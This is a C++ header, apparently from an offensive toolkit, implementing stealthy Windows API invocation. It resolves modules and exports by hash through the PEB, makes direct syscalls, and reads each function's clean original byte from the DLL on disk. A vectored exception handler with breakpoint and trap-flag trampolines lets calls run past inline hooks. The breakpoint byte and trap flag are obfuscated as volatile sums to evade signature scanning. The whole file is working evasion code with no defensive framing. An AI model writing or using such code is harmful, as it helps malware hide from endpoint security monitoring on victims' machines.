#pragma once
#include "common.hpp"
#include "hash.hpp"
#include "peb.hpp"
#include "syscall.hpp"

namespace stealth::tramp {

    struct trampoline_entry {
        uintptr_t func_addr;
        unsigned char original_byte;
        unsigned int module_hash;
        unsigned int func_hash;
    };

    inline static_map<trampoline_entry, 128> g_addr_map;
    inline spinlock g_lock;
    inline void* g_veh_handle = nullptr;

    namespace obf {
        __forceinline unsigned char bp_byte () { volatile unsigned char a = 0x65, b = 0x67; return a + b; }
        __forceinline unsigned int tf_flag () { volatile unsigned int a = 0x80, b = 0x80; return a + b; }
    }

    namespace detail {

        inline unsigned int rva_to_offset (unsigned int rva, IMAGE_NT_HEADERS* nt) {
            IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION (nt);
            for (int i = 0; i < nt->FileHeader.NumberOfSections; i++)
                if (rva >= sec[i].VirtualAddress && rva < sec[i].VirtualAddress + sec[i].Misc.VirtualSize)
                    return rva - sec[i].VirtualAddress + sec[i].PointerToRawData;
            return rva;
        }

        inline unsigned int get_export_rva (uintptr_t module_base, unsigned int func_hash) {
            auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(module_base);
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
            auto* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(module_base + dos->e_lfanew);
            if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
            auto& exp_entry = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            auto* exp = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(module_base + exp_entry.VirtualAddress);
            auto* funcs = reinterpret_cast<unsigned int*>(module_base + exp->AddressOfFunctions);
            auto* names = reinterpret_cast<unsigned int*>(module_base + exp->AddressOfNames);
            auto* ords = reinterpret_cast<unsigned short*>(module_base + exp->AddressOfNameOrdinals);
            for (unsigned int i = 0; i < exp->NumberOfNames; i++) {
                const char* name = reinterpret_cast<const char*>(module_base + names[i]);
                if (custom_hash_rt (name) == func_hash) return funcs[ords[i]];
            }
            return 0;
        }

        inline bool read_clean_byte (unsigned int module_hash, unsigned int func_rva, unsigned char* out) {
            wchar_t dll_path[512] = {};
            if (!peb::get_module_path (module_hash, dll_path, 512)) return false;
            uintptr_t k32 = peb::get_module_base (sc::h::kernel32);
            if (!k32) return false;

            using fn_CreateFileW = HANDLE (WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
            using fn_ReadFile = BOOL (WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
            using fn_SetFilePointer = DWORD (WINAPI*)(HANDLE, LONG, PLONG, DWORD);

            auto p_create = reinterpret_cast<fn_CreateFileW>(peb::get_export (k32, sc::h::CreateFileW));
            auto p_read = reinterpret_cast<fn_ReadFile>(peb::get_export (k32, sc::h::ReadFile_h));
            auto p_setfp = reinterpret_cast<fn_SetFilePointer>(peb::get_export (k32, sc::h::SetFilePointer));
            uintptr_t ntdll = peb::get_module_base (sc::h::ntdll);
            auto p_close = reinterpret_cast<sc::fn_NtClose>(peb::get_export (ntdll, sc::h::NtClose));
            if (!p_create || !p_read || !p_setfp || !p_close) return false;

            HANDLE file = p_create (dll_path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
            if (file == INVALID_HANDLE_VALUE) return false;

            unsigned char pe_buf[512]; DWORD bytes_read = 0;
            p_read (file, pe_buf, sizeof (pe_buf), &bytes_read, nullptr);
            auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(pe_buf);
            auto* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(pe_buf + dos->e_lfanew);
            unsigned int file_offset = rva_to_offset (func_rva, nt);

            p_setfp (file, file_offset, nullptr, FILE_BEGIN);
            p_read (file, out, 1, &bytes_read, nullptr);
            p_close (file);
            return bytes_read == 1;
        }

        inline bool patch_byte (uintptr_t addr, unsigned char byte) {
            PVOID base = reinterpret_cast<PVOID>(addr); SIZE_T sz = 1; ULONG old_prot = 0;
            NTSTATUS status = sc::invoke<NTSTATUS> (sc::h::NtProtectVM, NtCurrentProcess (), &base, &sz, (ULONG)PAGE_EXECUTE_READWRITE, &old_prot);
            if (!NT_SUCCESS (status)) return false;
            *reinterpret_cast<unsigned char*>(addr) = byte;
            base = reinterpret_cast<PVOID>(addr); sz = 1;
            sc::invoke<NTSTATUS> (sc::h::NtProtectVM, NtCurrentProcess (), &base, &sz, old_prot, &old_prot);
            sc::invoke<NTSTATUS> (sc::h::FlushIC, NtCurrentProcess (), reinterpret_cast<PVOID>(addr), (SIZE_T)1);
            return true;
        }

        inline LONG CALLBACK veh_handler (EXCEPTION_POINTERS* ep) {
            DWORD code = ep->ExceptionRecord->ExceptionCode;
            uintptr_t addr = reinterpret_cast<uintptr_t>(ep->ExceptionRecord->ExceptionAddress);

            if (code == EXCEPTION_BREAKPOINT) {
                unsigned int key = static_cast<unsigned int>(addr);
                auto* entry = g_addr_map.find (key);
                if (entry && entry->func_addr == addr) {
                    patch_byte (addr, entry->original_byte);
                    ep->ContextRecord->Rip = addr;
                    ep->ContextRecord->EFlags |= obf::tf_flag ();
                    return EXCEPTION_CONTINUE_EXECUTION;
                }
            }
            else if (code == EXCEPTION_SINGLE_STEP) {
                for (unsigned int delta = 1; delta <= 15; delta++) {
                    unsigned int probe_key = static_cast<unsigned int>(addr - delta);
                    auto* entry = g_addr_map.find (probe_key);
                    if (entry && entry->func_addr == addr - delta) {
                        if (*reinterpret_cast<unsigned char*>(entry->func_addr) == entry->original_byte) {
                            patch_byte (entry->func_addr, obf::bp_byte ());
                            return EXCEPTION_CONTINUE_EXECUTION;
                        }
                    }
                }
            }
            return EXCEPTION_CONTINUE_SEARCH;
        }
    }

    inline bool init_veh () {
        if (g_veh_handle) return true;
        uintptr_t ntdll = peb::get_module_base (sc::h::ntdll);
        using fn_AddVEH = PVOID (NTAPI*)(ULONG, PVECTORED_EXCEPTION_HANDLER);
        auto add_veh = reinterpret_cast<fn_AddVEH>(peb::get_export (ntdll, sc::h::RtlAddVEH));
        if (!add_veh) return false;
        g_veh_handle = add_veh (1, detail::veh_handler);
        return g_veh_handle != nullptr;
    }

    inline bool create (unsigned int module_hash, unsigned int func_hash) {
        lock_guard guard (g_lock);
        uintptr_t mod_base = peb::get_module_base (module_hash);
        if (!mod_base) return false;
        uintptr_t func_addr = peb::get_export (mod_base, func_hash);
        if (!func_addr) return false;
        unsigned int key = static_cast<unsigned int>(func_addr);
        if (g_addr_map.find (key)) return true;
        if (!g_veh_handle) init_veh ();

        unsigned int func_rva = detail::get_export_rva (mod_base, func_hash);
        if (!func_rva) return false;
        trampoline_entry entry = {};
        entry.func_addr = func_addr; entry.module_hash = module_hash; entry.func_hash = func_hash;
        if (!detail::read_clean_byte (module_hash, func_rva, &entry.original_byte)) return false;
        g_addr_map.insert (key, entry);
        return true;
    }

    template<typename Ret, typename... Args>
    inline Ret invoke (unsigned int module_hash, unsigned int func_hash, Args... args) {
        create (module_hash, func_hash);
        unsigned int key = static_cast<unsigned int>(peb::get_export (peb::get_module_base (module_hash), func_hash));
        auto* entry = g_addr_map.find (key);
        if (!entry) return Ret {};
        using func_t = Ret (WINAPI*)(Args...);
        return reinterpret_cast<func_t>(entry->func_addr) (static_cast<Args>(args)...);
    }

    inline void shutdown () {
        lock_guard guard (g_lock);
        if (g_veh_handle) {
            uintptr_t ntdll = peb::get_module_base (sc::h::ntdll);
            using fn_RemoveVEH = ULONG (NTAPI*)(PVOID);
            auto remove_veh = reinterpret_cast<fn_RemoveVEH>(peb::get_export (ntdll, sc::h::RtlRemoveVEH));
            if (remove_veh) remove_veh (g_veh_handle);
            g_veh_handle = nullptr;
        }
        mem_set (&g_addr_map, 0, sizeof (g_addr_map));
    }
}
